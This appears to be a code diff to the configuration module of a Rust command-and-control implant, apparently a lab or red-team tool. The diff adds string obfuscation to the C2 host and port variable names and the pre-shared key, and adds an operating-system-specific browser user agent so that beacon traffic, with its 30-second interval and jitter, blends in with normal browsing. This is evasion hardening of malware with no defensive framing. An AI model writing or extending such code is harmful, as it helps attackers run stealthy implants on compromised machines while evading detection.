@@ -37,8 +37,9 @@ impl Config {
         let mut cert_hash = [0u8; 32];
         cert_hash.copy_from_slice(&hash_bytes);
 
-        let host = std::env::var("OXIDE_C2_HOST").unwrap_or_else(|_| "127.0.0.1".to_string());
-        let port = std::env::var("OXIDE_C2_PORT")
+        let host = std::env::var(obfstr::obfstr!("C2_HOST"))
+            .unwrap_or_else(|_| "127.0.0.1".to_string());
+        let port = std::env::var(obfstr::obfstr!("C2_PORT"))
             .ok()
             .and_then(|p| p.parse().ok())
             .unwrap_or(4444);
@@ -48,18 +49,31 @@ impl Config {
         #[cfg(not(feature = "http-transport"))]
         let transport = TransportMode::Tls;
 
+        #[cfg(target_os = "windows")]
+        let user_agent = obfstr::obfstr!(
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
+             AppleWebKit/537.36 (KHTML, like Gecko) \
+             Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0"
+        )
+        .to_string();
+        #[cfg(not(target_os = "windows"))]
+        let user_agent = obfstr::obfstr!(
+            "Mozilla/5.0 (X11; Linux x86_64) \
+             AppleWebKit/537.36 (KHTML, like Gecko) \
+             Chrome/122.0.0.0 Safari/537.36"
+        )
+        .to_string();
+
         Self {
             host,
             port,
-            psk: "oxide-lab-psk".to_string(),
+            psk: obfstr::obfstr!("lab-changeme-2026").to_string(),
             salt: salt_bytes,
             cert_hash,
             transport,
             beacon_interval: Duration::from_secs(30),
             beacon_jitter: 0.25,
-            user_agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 \
-                         (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
-                .to_string(),
+            user_agent,
         }
     }
 }
